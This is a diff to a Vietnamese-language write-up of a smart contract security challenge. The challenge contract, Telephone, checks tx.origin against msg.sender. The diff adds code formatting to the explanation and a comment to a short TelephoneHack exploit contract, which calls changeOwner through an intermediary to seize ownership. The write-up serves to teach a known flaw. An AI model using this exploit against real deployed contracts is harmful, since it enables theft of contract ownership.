@@ -3,7 +3,7 @@
 1. Contract tấn công TelephoneHack được thiết kế để vượt qua điều kiện `if` của hàm `changeOwner`.
 2. `msg.sender` khi gọi `TelephoneHack.attack()` là địa chỉ của người dùng (attacker).
 3. `tx.origin` vẫn là địa chỉ của người dùng (không đổi qua nhiều contract).
-=> Do đó, msg.sender của contract Telephone sẽ là address(TelephoneHack) (contract trung gian) trong khi tx.origin vẫn là attacker, thỏa mãn điều kiện tx.origin != msg.sender.
+=> Do đó, msg.sender của contract Telephone sẽ là `address(TelephoneHack)` (contract trung gian) trong khi tx.origin vẫn là attacker, thỏa mãn điều kiện `tx.origin != msg.sender`.
 => Kẻ tấn công có thể thay đổi owner của contract Telephone.
 
 
@@ -23,7 +23,7 @@ contract TelephoneHack{
         telephone = ITelephone(_telephoneAddress);
     }
     function attack() external payable{
-        telephone.changeOwner(tx.origin);
+        telephone.changeOwner(tx.origin); // Địa chỉ của attacker, người gửi giao dịch đầu tiên từ bên ngoài.
     }
 }
 ```
